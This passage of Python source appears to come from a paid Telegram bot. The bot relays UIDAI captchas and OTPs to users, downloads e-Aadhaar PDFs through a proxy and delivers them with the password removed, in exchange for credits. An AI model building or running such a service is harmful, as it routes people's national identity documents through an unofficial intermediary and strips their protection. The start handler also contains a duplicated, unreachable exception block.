            f"{DIVIDER}\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    # ── DOWNLOAD CAPTCHA FLOW ────────────────────────────
    if current_step == 'awaiting_download_captcha':
        captcha_value = message_text.strip()
        d = get_session(chat_id)['data']
        id_val = d.get('id_value') or d.get('eid_number') or d.get('aadhaar_number')
        c_txn  = d.get('dl_captcha_txn_id')
        t_id   = d.get('dl_transaction_id')

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Sending Aadhaar download OTP…</i>")

        success, otp_txn_id, msg = bot.send_aadhaar_otp(chat_id, id_val, captcha_value, c_txn, t_id)
        if not success:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{msg}</b>\n\n<i>Loading new captcha…</i>")
            img_bytes, new_c_txn, new_t_id = bot.get_captcha(chat_id)
            if img_bytes:
                update_session_data(chat_id, 'dl_captcha_txn_id', new_c_txn)
                update_session_data(chat_id, 'dl_transaction_id', new_t_id)
                send_photo(chat_id, img_bytes, caption=f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🖼️ ɴᴇᴡ ᴄᴀᴘᴛᴄʜᴀ</b>", reply_markup=get_cancel_keyboard())
            else:
                clear_session(chat_id)
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Failed to get captcha.", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'download_otp_txn_id', otp_txn_id)
        set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"▸  Sent to your registered mobile number\n"
            f"⏰  Valid for 10 minutes\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  Enter the 6-digit OTP to download your PDF.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    # ── FINAL OTP & PDF DOWNLOAD ─────────────────────────
    if current_step == 'awaiting_final_otp':
        otp = re.sub(r'\D', '', message_text.strip())
        if len(otp) != 6:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Invalid OTP. Must be 6 digits.", reply_markup=get_cancel_keyboard())
            return

        d = get_session(chat_id)['data']
        id_val     = d.get('id_value') or d.get('eid_number') or d.get('aadhaar_number')
        otp_txn_id = d.get('download_otp_txn_id')
        t_id       = d.get('dl_transaction_id')
        verified_n = d.get('verified_name', 'Mr.')
        sticky_p   = d.get('sticky_proxy')

        # Protect session from idle expiration during download
        set_session(chat_id, 'downloading', d)

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<i>⏳  Downloading e-Aadhaar PDF from UIDAI…</i>"
        )

        success, pdf_res = bot.download_aadhaar_pdf(chat_id, id_val, otp, otp_txn_id, t_id, sticky_proxy=sticky_p)
        if not success:
            clear_session(chat_id)
            err_msg = html.escape(str(pdf_res or "Download failed"))
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>❌ ᴅᴏᴡɴʟᴏᴀᴅ ғᴀɪʟᴇᴅ</b>\n\n"
                f"⚠️  {err_msg}\n"
                f"✅  Credits not deducted.",
                reply_markup=get_menu_keyboard()
            )
            return

        def _safe_deliver(cid, path, name):
            try:
                deliver_pdf(cid, path, name)
            except Exception as ex:
                logger.error(f"Error in deliver_pdf for chat {cid}: {ex}", exc_info=True)

        worker_pool.submit(_safe_deliver, chat_id, pdf_res, verified_n)
        return

    send_message(
        chat_id,
        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n\n"
        f"<i>📲 sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ғʀᴏᴍ ᴛʜᴇ ᴍᴇɴᴜ ʙᴇʟᴏᴡ:</i>",
        reply_markup=get_welcome_inline_keyboard()
    )

# ============== GET UPDATES ==============
def get_updates(offset=None):
    url    = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    # Fast 10s long-polling for instant update delivery without long network hangs
    params = {'timeout': 10, 'allowed_updates': ['message', 'callback_query']}
    if offset:
        params['offset'] = offset
    try:
        response = get_polling_session().get(url, params=params, timeout=15)
        result   = response.json()
        if result.get('ok'):
            return result.get('result', [])
        return []
    except Exception as e:
        logger.error(f"Error getting updates: {e}")
        return []

# ============== MAIN ==============
def _safe_handle_callback(cid, cqid, data, mid, u):
    try:
        handle_callback(cid, cqid, data, message_id=mid, user_info=u)
    except Exception as e:
        logger.error(f"Error handling callback for chat {cid}: {e}", exc_info=True)

def _safe_handle_message(cid, text, mid, u):
    try:
        handle_message(cid, text, message_id=mid, user_info=u)
    except Exception as e:
        logger.error(f"Error handling message for chat {cid}: {e}", exc_info=True)

def _safe_handle_start(cid, mid, text, u):
    try:
        parts = text.split()
        referrer_id = None
        if len(parts) > 1 and parts[1].startswith('ref_'):
            try:
                referrer_id = int(parts[1][4:])
            except ValueError:
                pass

        if is_force_check_enabled() and not is_channel_member(cid):
            send_message(
                cid,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>📢 ᴊᴏɪɴ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ</b>\n\n"
                f"🔒  ʙᴏᴛ ᴋᴏ ᴜsᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ʜᴜᴍᴀʀᴇ ᴏғғɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ ᴋᴏ ᴊᴏɪɴ ᴋᴀʀɴᴀ ᴢᴀʀᴏᴏʀɪ ʜᴀɪ.\n\n"
                f"{DIVIDER}\n"
                f"<i>👇  ɴᴇᴇᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ʙᴜᴛᴛᴏɴ sᴇ ᴊᴏɪɴ ᴋᴀʀᴇɪɴ ᴀᴜʀ '✅ ɪ ʜᴀᴠᴇ ᴊᴏɪɴᴇᴅ' ᴅᴀʙᴀʏᴇɪɴ.</i>",
                reply_markup=get_join_keyboard()
            )
            return

        is_new = ensure_user(
            cid,
            referrer_id,
            first_name=u.get('first_name'),
            last_name=u.get('last_name'),
            username=u.get('username')
        )
        clear_session(cid)
        cr = get_credits(cid)
        cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ" if cr == float('inf') else str(int(cr))
        bonus_line = "\n🎁  ʙᴏɴᴜs        ·  <b>+1 credit for joining!</b>" if is_new else ""

        # Remove any existing persistent reply keyboard
        remove_reply_keyboard(cid)

        # Send welcome message with rich interactive inline keyboard
        send_message(
            cid,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n\n"
            f"<b>🇮🇳 ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғ — sᴛʀᴀɪɢʜᴛ ᴛᴏ ᴛᴇʟᴇɢʀᴀᴍ</b>\n\n"
            f"⚡  sᴏᴜʀᴄᴇ    ·  ᴏғғɪᴄɪᴀʟ ᴜɪᴅᴀɪ ᴘᴏʀᴛᴀʟ\n"
            f"🔓  ᴅᴇʟɪᴠᴇʀʏ  ·  ᴀᴜᴛᴏ-ᴜɴʟᴏᴄᴋᴇᴅ, ɴᴏ ᴘᴀssᴡᴏʀᴅ\n"
            f"⚡  ᴍᴇᴛʜᴏᴅs   ·  ᴍᴏʙɪʟᴇ  ·  ᴀᴀᴅʜᴀᴀʀ  ·  ᴇɪᴅ  ·  ғɪʀᴇʙᴀsᴇ"
            f"{bonus_line}\n\n"
            f"{DIVIDER}\n"
            f"💰  ᴄʀᴇᴅɪᴛs  ·  <b>{cr_display}</b>\n\n"
            f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ ʙᴇɢɪɴ.</i>",
            reply_markup=get_welcome_inline_keyboard()
        )
        try:
            set_message_reaction(cid, message_id=mid, emoji="⚡")
        except Exception:
            pass
    except Exception as e:
        logger.error(f"Error handling start for chat {cid}: {e}", exc_info=True)
        try:
            set_message_reaction(cid, message_id=mid, emoji="⚡")
        except Exception:
            pass
    except Exception as e:
        logger.error(f"Error handling start for chat {cid}: {e}", exc_info=True)

def main():
    print("━" * 55)
    print(f"  {BOT_NAME}  —  Starting Up (v2.0 SmallCaps & UPI Enhanced)")
    print("━" * 55)

    if not TELEGRAM_BOT_TOKEN:
        print("❌ TELEGRAM_BOT_TOKEN is not set in .env")
        return

    try:
        r = get_telegram_session().get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe", timeout=10)
        bot_info = r.json()
        if bot_info.get('ok'):
            username = bot_info['result']['username']
            global _bot_username
            _bot_username = username
            print(f"✅  Online     @{username}")
            print(f"💳  UPI Gateway {gateway.base_url}")
            print(f"📁  Database   MongoDB ({database.MONGO_DB_NAME})")
            print(f"👑  Owner      {OWNER_ID}")
            print(f"🛡️  Admins     {', '.join(str(a) for a in ADMIN_IDS)}")
        else:
            print(f"❌  Telegram Bot authentication failed: {bot_info}")
            return
    except Exception as e:
        print(f"❌  Connection Error: {e}")
        return

    t = threading.Thread(target=_cleanup_sessions, daemon=True)
    t.start()

    # Multi-threaded worker pool so slow network calls (e.g. UIDAI timeouts) NEVER block polling!
    worker_pool = ThreadPoolExecutor(max_workers=25, thread_name_prefix="tg_worker")

    print("━" * 55)
    print("  🟢 Running  —  Ready to accept users & payments")
    print("━" * 55)

    last_update_id = 0

    while True:
        try:
            updates = get_updates(last_update_id + 1)
            for update in updates:
                last_update_id = update.get('update_id')

                if 'callback_query' in update:
                    cq   = update['callback_query']
                    cid  = cq['message']['chat']['id']
                    cqid = cq['id']
                    data = cq.get('data', '')
                    mid  = cq.get('message', {}).get('message_id')
                    u    = cq.get('from', {})
                    worker_pool.submit(_safe_handle_callback, cid, cqid, data, mid, u)

                elif 'message' in update:
                    msg  = update['message']
                    cid  = msg['chat']['id']
                    mid  = msg.get('message_id')
                    text = msg.get('text', '').strip()
                    u    = msg.get('from', {})
                    if not text:
                        continue

                    if text.startswith('/start'):
                        worker_pool.submit(_safe_handle_start, cid, mid, text, u)
                    else:
                        worker_pool.submit(_safe_handle_message, cid, text, mid, u)

            # If updates were received and processed, poll immediately; else yield briefly
            if not updates:
                time.sleep(0.05)

        except KeyboardInterrupt:
            print("\n🛑 Stopped by User")
            break
        except Exception as e:
            logger.error(f"Main loop error: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main()
